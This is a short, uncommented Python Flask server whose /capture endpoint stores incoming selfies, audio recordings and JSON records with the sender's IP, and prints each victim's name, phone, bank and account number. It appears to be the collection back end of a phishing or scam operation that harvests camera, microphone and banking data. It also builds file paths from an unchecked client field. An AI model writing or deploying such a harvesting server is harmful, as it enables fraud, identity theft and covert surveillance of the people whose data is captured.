from flask import Flask, request, jsonify
import json
import os
import base64
from datetime import datetime

app = Flask(__name__)
os.makedirs('data', exist_ok=True)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data'}), 400

        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        data_type = data.get('type', 'unknown')

        if data_type == 'selfie' and 'image' in data:
            media = data['image'].split('base64,')[1]
            with open(f"data/selfie_{timestamp}.jpg", 'wb') as f:
                f.write(base64.b64decode(media))
            data['_media'] = f"selfie_{timestamp}.jpg"
            del data['image']

        elif data_type == 'audio' and 'audio' in data:
            media = data['audio'].split('base64,')[1]
            with open(f"data/audio_{timestamp}.webm", 'wb') as f:
                f.write(base64.b64decode(media))
            data['_media'] = f"audio_{timestamp}.webm"
            del data['audio']

        data['_ip'] = ip
        data['_server_time'] = datetime.now().isoformat()

        with open(f"data/{data_type}_{timestamp}.json", 'w') as f:
            json.dump(data, f, indent=2)

        print(f"[+] {data_type} from {ip}")

        if data_type == 'banking_details':
            print(f"    👤 {data.get('fullname')} | {data.get('phone')}")
            print(f"    🏦 {data.get('bank')} | {data.get('account')}")

        return jsonify({'status': 'ok'}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)